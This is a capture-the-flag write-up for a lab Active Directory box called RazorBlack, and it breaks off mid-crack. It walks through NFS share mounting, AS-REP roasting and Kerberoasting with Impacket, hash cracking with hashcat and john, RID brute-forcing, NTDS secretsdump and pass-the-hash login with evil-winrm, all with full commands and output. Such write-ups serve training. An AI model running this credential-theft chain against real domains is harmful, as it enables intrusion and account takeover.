```
RazorBlack
These guys call themselves hackers. Can you show them who's the boss ??

Throw something like a rock on the big green thingy on the right side here to deploy your box.

The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.

This room is proudly made by: Xyan1d3

Every solver of this box will get a free cookie when completing this box.

If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.

This will test your Active Directory enumeration and exploitation knowledge.

Submit your flags and answers to prove your progression.

The following things are covered in this Write-up.

    Background
    Enumerate Domain Controller
    Exploiting Kerberos
    Administrator Privilege Escalation

What is the Domain Name?

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-08-06 19:23:58Z)
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC

389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
raz0rblack.thm

What is Steven's Flag?
Now we need to enumerate the Machine Further.
# Port 111

We will start from here. Since that we have verified that an NFS service is running (2049/TCP open NFS), we can deepen and see what else we can obtain.

Este comando se puede usar en un servidor de NFS, para ver todos los hosts que tienen algún sistema de ficheros montado sobre el servidor. Con la opción -a se muestra tanto el host, como los directorios.

┌──(kali㉿kali)-[~/Downloads]
└─$ showmount --help
Usage: showmount [-adehv]
       [--all] [--directories] [--exports]
       [--no-headers] [--help] [--version] [host]
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.125.128             
Export list for 10.10.125.128:
/users (everyone)

/users folders can be accessed by anyone. Let's try to mount that
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir smb                              
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs -o vers=2 10.10.125.128:/users ./smb 
mount.nfs: requested NFS version or transport protocol is not supported
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs  10.10.125.128:/users ./smb 
s                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.pdf                     Market_Place
46635.py                  NAX
alice_key                 nikto
backdoors                 overpass2.pcapng
BinaryHeaven              overpass.go
buildscript.sh            PHishing
Chankro                   PRET
C_hooking                 priv.key
cracking.txt              PurgeIrrelevantData_1826.ps1
credential.pgp            responder_ntlm_hash
CustomerDetails.xlsx      reverse.exe
CustomerDetails.xlsx.gpg  reverse.msi
DDOS                      robert_ssh.txt
Devservice.exe            SAM
DNS_MANIPUL               shadow.txt
download.dat              SharpGPOAbuse
download.dat2             SharpGPOAbuse.exe
downloads                 shell.php
exploit                   smb
exploit_commerce.py       socat
Ghostcat-CNVD-2020-10487  solar_log4j
Git_Happens               starkiller-1.10.0.AppImage
hash                      startup.bat
hashes.txt                stats.db
hash.txt                  system.txt
hydra.rsa                 teaParty
ICS_plant                 tryhackme.asc
id_rsa                    user.png
id_rsa_robert             users.db
key                       walrus_and_the_carpenter.py
KIBA                      Windows_priv
Lian_Yu                   Witty
linpeas.sh                WittyAle.ovpn
malicioso.png             WordPress_CVE202129447
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ cd smb        
cd: permission denied: smb
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.pdf                     Market_Place
46635.py                  NAX
alice_key                 nikto
backdoors                 overpass2.pcapng
BinaryHeaven              overpass.go
buildscript.sh            PHishing
Chankro                   PRET
C_hooking                 priv.key
cracking.txt              PurgeIrrelevantData_1826.ps1
credential.pgp            responder_ntlm_hash
CustomerDetails.xlsx      reverse.exe
CustomerDetails.xlsx.gpg  reverse.msi
DDOS                      robert_ssh.txt
Devservice.exe            SAM
DNS_MANIPUL               shadow.txt
download.dat              SharpGPOAbuse
download.dat2             SharpGPOAbuse.exe
downloads                 shell.php
exploit                   smb
exploit_commerce.py       socat
Ghostcat-CNVD-2020-10487  solar_log4j
Git_Happens               starkiller-1.10.0.AppImage
hash                      startup.bat
hashes.txt                stats.db
hash.txt                  system.txt
hydra.rsa                 teaParty
ICS_plant                 tryhackme.asc
id_rsa                    user.png
id_rsa_robert             users.db
key                       walrus_and_the_carpenter.py
KIBA                      Windows_priv
Lian_Yu                   Witty
linpeas.sh                WittyAle.ovpn
malicioso.png             WordPress_CVE202129447
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ cd smb
cd: permission denied: smb
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo kali                                    
sudo: kali: command not found
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo su  
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cd smb                 
                                                                                
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# ls
employee_status.xlsx  sbradley.txt

┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# su kali
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ ls
ls: cannot open directory '.': Permission denied
                                                                                
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ sudo su                   
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# cat sbradley.txt  
��THM{ab53e05c9a98def00314a14ccbfa8104}

there is another file employee_status.xlsx let’s read the content of this file. in my case I used MS office, you can use any office application. Extracted usernames from the xlsx file:

content

daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin

What is the zip file's password?

We will make a modified users file according to the naming convention used
steven Bradley -> sbradely


dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin

Now we have a user list so let's try it against Kerberos. We will use IMPACKET’s GetNPUsers to brute force Kerebos and the Hash of an existing user from our User List.

Add the machine IP address to the /etc/hosts file to continue this attack, Otherwise, you will not be able to use the Tool

┌──(kali㉿kali)-[~/Downloads]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.18.221    raz0rblack raz0rblack.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile user.lst -no-pass -dc-ip 10.10.18.221 -format hashcat -outputfile hashes.asreproast              
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)


# getting the hash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hashes.asreproast 
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:65722ab4e4a9981448677554d3e4c0f4$70406f0d7057f97bd8c02f51e5899961a43046c460dc9170848067e6558c7f6c9e23767d844036b2be0759c36193965d022ea59923d0a199d2bda1a93f882800ee6d724170f31f1e33d3f5b87bbf72c6de9a4b9375c9073538124662bcc2232223ee5faf88ceb6c6ef2478127826a4df6daca9b6b2936d5d8f7694929c8cafe3f83833291bc033d5456f7981805e6ae9147de848a99f437433344c7e39ba6b0c89b3f7d923bd04550df9624dcdb7c3ba33c24e2534331713c26bb98ecd761919b28a6f5e10940dc7e37107ac139f042f659162ca27d63204155a1df6fc167e6adfdade985bfb0bf529d4b802109ef878

#bruteforce
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:65722ab4e4a9981448677554d3e4c0f4$70406f0d7057f97bd8c02f51e5899961a43046c460dc9170848067e6558c7f6c9e23767d844036b2be0759c36193965d022ea59923d0a199d2bda1a93f882800ee6d724170f31f1e33d3f5b87bbf72c6de9a4b9375c9073538124662bcc2232223ee5faf88ceb6c6ef2478127826a4df6daca9b6b2936d5d8f7694929c8cafe3f83833291bc033d5456f7981805e6ae9147de848a99f437433344c7e39ba6b0c89b3f7d923bd04550df9624dcdb7c3ba33c24e2534331713c26bb98ecd761919b28a6f5e10940dc7e37107ac139f042f659162ca27d63204155a1df6fc167e6adfdade985bfb0bf529d4b802109ef878:roastpotatoes
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:65722ab4e4a9...9ef878
Time.Started.....: Sat Aug  6 17:48:20 2022 (8 secs)
Time.Estimated...: Sat Aug  6 17:48:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   636.1 kH/s (0.79ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4221952/14344385 (29.43%)
Rejected.........: 0/4221952 (0.00%)
Restore.Point....: 4220928/14344385 (29.43%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: robb-lfc -> roastmutton
Hardware.Mon.#1..: Util: 41%

Started: Sat Aug  6 17:47:47 2022
Stopped: Sat Aug  6 17:48:29 2022

# cracked hash
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 hashes.asreproast --show                          
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:65722ab4e4a9981448677554d3e4c0f4$70406f0d7057f97bd8c02f51e5899961a43046c460dc9170848067e6558c7f6c9e23767d844036b2be0759c36193965d022ea59923d0a199d2bda1a93f882800ee6d724170f31f1e33d3f5b87bbf72c6de9a4b9375c9073538124662bcc2232223ee5faf88ceb6c6ef2478127826a4df6daca9b6b2936d5d8f7694929c8cafe3f83833291bc033d5456f7981805e6ae9147de848a99f437433344c7e39ba6b0c89b3f7d923bd04550df9624dcdb7c3ba33c24e2534331713c26bb98ecd761919b28a6f5e10940dc7e37107ac139f042f659162ca27d63204155a1df6fc167e6adfdade985bfb0bf529d4b802109ef878:roastpotatoes

trying loggin in with new creds (SMB)

┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.10.18.221 -u twilliams -p roastpotatoes
[+] IP: 10.10.18.221:445        Name: raz0rblack                                        
        Disk                                                    Permissions    Comment
        ----                                                    -----------    -------
        ADMIN$                                                  NO ACCESS      Remote Admin
        C$                                                      NO ACCESS      Default share
        IPC$                                                    READ ONLY      Remote IPC
        NETLOGON                                                READ ONLY      Logon server share 
        SYSVOL                                                  READ ONLY      Logon server share 
        trash                                                   NO ACCESS      Files Pending for deletion

we can read IPC$, that means we can bruteforce ussernames:
***crackmapexec***
En líneas generales se puede decir que es una herramienta de post-explotación. Está escrita en Python y permite hacer movimientos laterales en una red. 

┌──(kali㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.18.221 -u 'twilliams' -p 'roastpotatoes' --rid-brute
SMB         10.10.18.221    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.18.221    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.18.221    445    HAVEN-DC         [+] Brute forcing RIDs
SMB         10.10.18.221    445    HAVEN-DC         498: RAZ0RBLACK\Enterprise Read-only Domain Controllers (SidTypeGroup)                                      
SMB         10.10.18.221    445    HAVEN-DC         500: RAZ0RBLACK\Administrator (SidTypeUser)                                                                 
SMB         10.10.18.221    445    HAVEN-DC         501: RAZ0RBLACK\Guest (SidTypeUser)                                                                         
SMB         10.10.18.221    445    HAVEN-DC         502: RAZ0RBLACK\krbtgt (SidTypeUser)                                                                        
SMB         10.10.18.221    445    HAVEN-DC         512: RAZ0RBLACK\Domain Admins (SidTypeGroup)                                                                
SMB         10.10.18.221    445    HAVEN-DC         513: RAZ0RBLACK\Domain Users (SidTypeGroup)                                                                 
SMB         10.10.18.221    445    HAVEN-DC         514: RAZ0RBLACK\Domain Guests (SidTypeGroup)                                                                
SMB         10.10.18.221    445    HAVEN-DC         515: RAZ0RBLACK\Domain Computers (SidTypeGroup)                                                             
SMB         10.10.18.221    445    HAVEN-DC         516: RAZ0RBLACK\Domain Controllers (SidTypeGroup)                                                           
SMB         10.10.18.221    445    HAVEN-DC         517: RAZ0RBLACK\Cert Publishers (SidTypeAlias)                                                              
SMB         10.10.18.221    445    HAVEN-DC         518: RAZ0RBLACK\Schema Admins (SidTypeGroup)                                                                
SMB         10.10.18.221    445    HAVEN-DC         519: RAZ0RBLACK\Enterprise Admins (SidTypeGroup)                                                            
SMB         10.10.18.221    445    HAVEN-DC         520: RAZ0RBLACK\Group Policy Creator Owners (SidTypeGroup)                                                  
SMB         10.10.18.221    445    HAVEN-DC         521: RAZ0RBLACK\Read-only Domain Controllers (SidTypeGroup)                                                 
SMB         10.10.18.221    445    HAVEN-DC         522: RAZ0RBLACK\Cloneable Domain Controllers (SidTypeGroup)                                                 
SMB         10.10.18.221    445    HAVEN-DC         525: RAZ0RBLACK\Protected Users (SidTypeGroup)                                                              
SMB         10.10.18.221    445    HAVEN-DC         526: RAZ0RBLACK\Key Admins (SidTypeGroup)                                                                   
SMB         10.10.18.221    445    HAVEN-DC         527: RAZ0RBLACK\Enterprise Key Admins (SidTypeGroup)                                                        
SMB         10.10.18.221    445    HAVEN-DC         553: RAZ0RBLACK\RAS and IAS Servers (SidTypeAlias)                                                          
SMB         10.10.18.221    445    HAVEN-DC         571: RAZ0RBLACK\Allowed RODC Password Replication Group (SidTypeAlias)                                      
SMB         10.10.18.221    445    HAVEN-DC         572: RAZ0RBLACK\Denied RODC Password Replication Group (SidTypeAlias)                                       
SMB         10.10.18.221    445    HAVEN-DC         1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)                                                                    
SMB         10.10.18.221    445    HAVEN-DC         1101: RAZ0RBLACK\DnsAdmins (SidTypeAlias)                                                                   
SMB         10.10.18.221    445    HAVEN-DC         1102: RAZ0RBLACK\DnsUpdateProxy (SidTypeGroup)                                                              
SMB         10.10.18.221    445    HAVEN-DC         1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)                                                                      
SMB         10.10.18.221    445    HAVEN-DC         1107: RAZ0RBLACK\lvetrova (SidTypeUser)                                                                     
SMB         10.10.18.221    445    HAVEN-DC         1108: RAZ0RBLACK\sbradley (SidTypeUser)                                                                     
SMB         10.10.18.221    445    HAVEN-DC         1109: RAZ0RBLACK\twilliams (SidTypeUser) 

new users add them to a file

xyan1d3
lvetrova
sbradley
twilliams

Password:

roastpotatoes

checking for password reuse:

┌──(kali㉿kali)-[~/Downloads]
└─$ nano user.lst                                                              
                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ nano pass.lst   
                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.18.221 -u user.lst -p pass.lst                   
SMB         10.10.18.221    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.18.221    445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.18.221    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.18.221    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 

STATUS_PASSWORD_MUST_CHANGE  let’s change the password for sbradley

┌──(kali㉿kali)-[~/Downloads]
└─$ smbpasswd -r 10.10.18.221 -U sbradley                  
Old SMB password: roastpotatoes
New SMB password: Passw0rd!
Retype new SMB password: Passw0rd!
Password changed for user sbradley

Enumerate SMB with new password:
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# smbclient //10.10.145.48/trash --user='sbradley%Passw0rd!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021
r
                5101823 blocks of size 4096. 968274 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (760.0 KiloBytes/sec) (average 735.2 KiloBytes/sec)
getting file \sbradley.txt of size 37 as sbradley.txt (0.0 KiloBytes/sec) (average 712.5 KiloBytes/sec)
smb: \> exit
                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# ls
chat_log_20210222143423.txt  experiment_gone_wrong.zip  sbradley.txt
                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# exiftool experiment_gone_wrong.zip
ExifTool Version Number         : 12.43
File Name                       : experiment_gone_wrong.zip
Directory                       : .
File Size                       : 19 MB
File Modification Date/Time     : 2022:08:06 19:07:03-04:00
File Access Date/Time           : 2022:08:06 19:06:39-04:00
File Inode Change Date/Time     : 2022:08:06 19:07:03-04:00
File Permissions                : -rw-r--r--
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0x0009
Zip Compression                 : Deflated
Zip Modify Date                 : 2021:03:16 11:08:56
Zip CRC                         : 0xbdcca7e2
Zip Compressed Size             : 2941739
Zip Uncompressed Size           : 16281600
Zip File Name                   : system.hive
Warning                         : [minor] Use the Duplicates option to extract tags for all 2 files
                                                                                           

Cracking the zip and looking at contents:    

# convert to hash that john can crack
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# zip2john experiment_gone_wrong.zip > hash
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)     
1g 0:00:00:01 DONE (2022-08-06 19:07) 0.6060g/s 5079Kp/s 5079Kc/s 5079KC/s elfo2009..elboty2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# unzip experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: 
  inflating: system.hive             
  inflating: ntds.dit     




What is Ljudmila's Hash?

Extract hashes

┌──(kali㉿kali)-[~/Downloads/smb]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL > hashes.txt
                                                                                           
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ ls
chat_log_20210222143423.txt  hash        ntds.dit      system.hive
experiment_gone_wrong.zip    hashes.txt  sbradley.txt

We need to extract all NTHASHes
After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ cat hashes.txt | cut -d ":" -f 4 > pothashes.txt
crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
...[snip]...
SMB         MACHINE_IP    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d

What is Ljudmila's Flag?

PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ evil-winrm -i 10.10.146.199 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> whoami
raz0rblack\lvetrova
*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
*Evil-WinRM* PS C:\Users\lvetrova> ls


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml


*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}


What is Xyan1d3's password?

We will be using pass-the-hash with lvetrova creds:

A pass the hash attack is an exploit in which an attacker steals a hashed user credential and — without cracking it — reuses it to trick an authentication system into creating a new authenticated session on the same network.

Pass the hash is primarily a lateral movement technique. This means that hackers are using pass the hash to extract additional information and credentials after already compromising a device.
Kerberoasting with pass-the-hash with lvetrovas creds:

──(kali㉿kali)-[~/Downloads/smb]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.146.199 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
                                                                                           
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ ls
chat_log_20210222143423.txt  hash               hashes.txt  pothashes.txt  system.hive
experiment_gone_wrong.zip    hashes.kerberoast  ntds.dit    sbradley.txt
                                                                                           
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

